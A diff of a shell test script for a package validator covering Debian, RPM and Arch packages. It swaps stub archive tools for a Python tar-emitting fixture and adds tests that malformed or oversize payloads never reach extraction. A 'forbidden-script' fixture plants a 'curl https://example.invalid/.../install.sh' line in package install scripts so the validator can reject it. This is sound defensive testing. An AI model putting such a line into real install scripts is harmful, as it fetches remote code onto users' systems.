@@ -351,38 +351,55 @@ fi
 # The validator must reject both a declared dependency and a file introduced
 # only while extracting the completed package payload.
 mkdir -p "$temp_dir/archive-tools"
-printf '%s\n' \
-    '#!/bin/sh' \
-    'case "$1" in' \
-    '  --control)' \
-    '    destination=$3' \
-    '    mkdir -p "$destination"' \
-    '    printf "Package: balun\\nDepends: gstreamer1.0-plugins-good\\n" > "$destination/control"' \
-    '    printf "#!/bin/sh\\n/sbin/ldconfig\\n" > "$destination/postinst"' \
-    '    case "${TEST_ARCHIVE_MODE:-allowed}" in' \
-    '      forbidden-dependency)' \
-    '        printf "Recommends: %s-runtime\\n" "$TEST_FORBIDDEN_TOKEN" >> "$destination/control"' \
-    '        ;;' \
-    '      forbidden-script)' \
-    '        printf "curl https://example.invalid/%s/install.sh\\n" "$TEST_FORBIDDEN_TOKEN" >> "$destination/postinst"' \
-    '        ;;' \
-    '      binary-control)' \
-    '        printf "\\000\\001binary" > "$destination/blob"' \
-    '        ;;' \
-    '    esac' \
-    '    ;;' \
-    '  --extract)' \
-    '    destination=$3' \
-    '    mkdir -p "$destination/usr/lib"' \
-    '    if [ "${TEST_ARCHIVE_MODE:-allowed}" = forbidden-payload ]; then' \
-    '      touch "$destination/usr/lib/${TEST_FORBIDDEN_TOKEN}.so"' \
-    '    else' \
-    '      touch "$destination/usr/lib/libgstlibav.so"' \
-    '    fi' \
-    '    ;;' \
-    '  *) exit 2 ;;' \
-    'esac' \
-    > "$temp_dir/archive-tools/dpkg-deb"
+# Debian and Arch fixtures emit real, inert tar bytes. Only admitted members
+# are handed to the real GNU tar below; malformed fixtures stop at preflight.
+cat > "$temp_dir/archive-tools/dpkg-deb" <<'PY'
+#!/usr/bin/env python3
+import io
+import os
+from pathlib import Path
+import sys
+import tarfile
+kind = "arch" if Path(sys.argv[0]).name.startswith("zstd") else {
+    "--ctrl-tarfile": "deb-control", "--fsys-tarfile": "deb-data",
+}[sys.argv[1]]
+if os.environ.get("TEST_TAR_KIND") == kind:
+    sys.stdout.buffer.write(Path(os.environ["TEST_TAR_PAYLOAD"]).read_bytes())
+    raise SystemExit(0)
+mode = os.environ.get("TEST_ARCHIVE_MODE", "allowed")
+token = os.environ.get("TEST_FORBIDDEN_TOKEN", "unused")
+files = {}
+if kind == "deb-control":
+    files["control"] = b"Package: balun\nDepends: gstreamer1.0-plugins-good\n"
+    files["postinst"] = b"#!/bin/sh\n/sbin/ldconfig\n"
+    if mode == "forbidden-dependency":
+        files["control"] += f"Recommends: {token}-runtime\n".encode()
+    if mode == "forbidden-script":
+        files["postinst"] += f"curl https://example.invalid/{token}/install.sh\n".encode()
+    if mode == "binary-control":
+        files["blob"] = b"\0\1binary"
+else:
+    library = f"{token}.so" if mode == "forbidden-payload" else "libgstlibav.so"
+    files[f"usr/lib/{library}"] = b""
+    if kind == "arch":
+        dependency = f"{token}-runtime" if mode == "forbidden-dependency" else "gst-plugins-good"
+        files[".PKGINFO"] = f"depend = {dependency}\n".encode()
+        if mode == "forbidden-script":
+            files[".INSTALL"] = f"curl https://example.invalid/{token}/install.sh\n".encode()
+with tarfile.open(fileobj=sys.stdout.buffer, mode="w|", format=tarfile.USTAR_FORMAT) as archive:
+    for name, data in files.items():
+        member = tarfile.TarInfo(name)
+        member.size = len(data)
+        archive.addfile(member, io.BytesIO(data))
+PY
+cp "$temp_dir/archive-tools/dpkg-deb" "$temp_dir/archive-tools/zstd"
+BALUN_TEST_REAL_TAR=$(command -v tar)
+export BALUN_TEST_REAL_TAR
+cat > "$temp_dir/archive-tools/tar" <<'EOF'
+#!/bin/sh
+[ -z "${TEST_TAR_REACHED_PATH:-}" ] || touch "$TEST_TAR_REACHED_PATH"
+exec "$BALUN_TEST_REAL_TAR" "$@"
+EOF
 printf '%s\n' \
     '#!/bin/sh' \
     'case "$2:${TEST_ARCHIVE_MODE:-allowed}" in' \
@@ -423,42 +440,18 @@ printf '%s\n' \
     '  touch usr/lib/libgstlibav.so' \
     'fi' \
     > "$temp_dir/archive-tools/cpio"
-printf '%s\n' \
-    '#!/bin/sh' \
-    'case "$1" in' \
-    '  -xOf)' \
-    '    if [ "${TEST_ARCHIVE_MODE:-allowed}" = forbidden-dependency ]; then' \
-    '      echo "depend = ${TEST_FORBIDDEN_TOKEN}-runtime"' \
-    '    else' \
-    '      echo "depend = gst-plugins-good"' \
-    '    fi' \
-    '    ;;' \
-    '  -xf)' \
-    '    destination=$4' \
-    '    mkdir -p "$destination/usr/lib"' \
-    '    if [ "${TEST_ARCHIVE_MODE:-allowed}" = forbidden-payload ]; then' \
-    '      touch "$destination/usr/lib/${TEST_FORBIDDEN_TOKEN}.so"' \
-    '    else' \
-    '      touch "$destination/usr/lib/libgstlibav.so"' \
-    '    fi' \
-    '    if [ "${TEST_ARCHIVE_MODE:-allowed}" = forbidden-script ]; then' \
-    '      printf "curl https://example.invalid/%s/install.sh\\n" "$TEST_FORBIDDEN_TOKEN" > "$destination/.INSTALL"' \
-    '    fi' \
-    '    ;;' \
-    '  *) exit 2 ;;' \
-    'esac' \
-    > "$temp_dir/archive-tools/bsdtar"
 chmod +x \
     "$temp_dir/archive-tools/dpkg-deb" \
     "$temp_dir/archive-tools/rpm" \
     "$temp_dir/archive-tools/rpm2cpio" \
     "$temp_dir/archive-tools/cpio" \
-    "$temp_dir/archive-tools/bsdtar"
+    "$temp_dir/archive-tools/zstd" \
+    "$temp_dir/archive-tools/tar"
 
 # Every native metadata/payload read must use the same frozen input. These
 # wrappers replace the original path after the first read; later reads still
 # have to see the initial bytes through one private path, not the replacement.
-for tool in dpkg-deb rpm rpm2cpio bsdtar; do
+for tool in dpkg-deb rpm rpm2cpio zstd; do
     mv "$temp_dir/archive-tools/$tool" "$temp_dir/archive-tools/$tool.real"
     cat > "$temp_dir/archive-tools/$tool" <<'EOF'
 #!/bin/sh
@@ -467,6 +460,7 @@ if [ -n "${TEST_SNAPSHOT_EXPECTED:-}" ]; then
     case "${0##*/}" in
         rpm) input=$3 ;;
         rpm2cpio) input=$1 ;;
+        zstd) input=$5 ;;
         *) input=$2 ;;
     esac
     [ "$input" != "$TEST_SNAPSHOT_ORIGINAL" ] || exit 91
@@ -508,8 +502,11 @@ for package_mode in deb rpm arch; do
         echo "Archive inspectors did not share one snapshot" >&2
         exit 1
     }
-    [ "$(wc -l < "$temp_dir/snapshot-paths")" -ge 2 ] || {
-        echo "Archive snapshot fixture did not exercise separate metadata/payload reads" >&2
+    minimum_reads=2
+    # Arch metadata is now read from the same admitted decoded tar/tree.
+    [ "$package_mode" != arch ] || minimum_reads=1
+    [ "$(wc -l < "$temp_dir/snapshot-paths")" -ge "$minimum_reads" ] || {
+        echo "Archive snapshot fixture did not exercise the expected producer reads" >&2
         exit 1
     }
     snapshot_path=$(head -n 1 "$temp_dir/snapshot-paths")
@@ -549,6 +546,42 @@ for fixture in invalid oversize-member; do
         echo "Rejected RPM payload leaked its private inspection files" >&2
         exit 1
     fi
+done
+
+# Neither Debian control nor data, nor any Arch member, reaches tar until
+# every required decoded archive has passed. Rejected bytes are never extracted.
+python3 -B - "$script_dir" "$temp_dir/archive-tools" <<'PY'
+from pathlib import Path
+import sys
+sys.path.insert(0, sys.argv[1])
+from test_tar_payload import archive, member
+root = Path(sys.argv[2])
+(root / "invalid.tar").write_bytes(b"invalid payload")
+(root / "oversize-member.tar").write_bytes(archive(member("file", size=268435457)))
+PY
+mkdir "$temp_dir/tar-rejection-tmp"
+for kind in deb-control deb-data arch; do
+    package_mode=deb
+    package="$temp_dir/fixture.deb"
+    if [ "$kind" = arch ]; then
+        package_mode=arch
+        package="$temp_dir/fixture.pkg.tar.zst"
+    fi
+    for fixture in invalid oversize-member; do
+        expect_status 1 env PATH="$temp_dir/archive-tools:$PATH" \
+            TMPDIR="$temp_dir/tar-rejection-tmp" TEST_TAR_KIND="$kind" \
+            TEST_TAR_PAYLOAD="$temp_dir/archive-tools/$fixture.tar" \
+            TEST_TAR_REACHED_PATH="$temp_dir/tar-reached" \
+            "$validator" "--$package_mode" "$package"
+        [ ! -e "$temp_dir/tar-reached" ] || {
+            echo "Rejected tar payload reached the native extractor" >&2
+            exit 1
+        }
+        if find "$temp_dir/tar-rejection-tmp" -mindepth 1 -print -quit | grep -q .; then
+            echo "Rejected tar payload leaked its private inspection files" >&2
+            exit 1
+        fi
+    done
 done
 
 # Exercise the complete Flatpak app-commit boundary without requiring
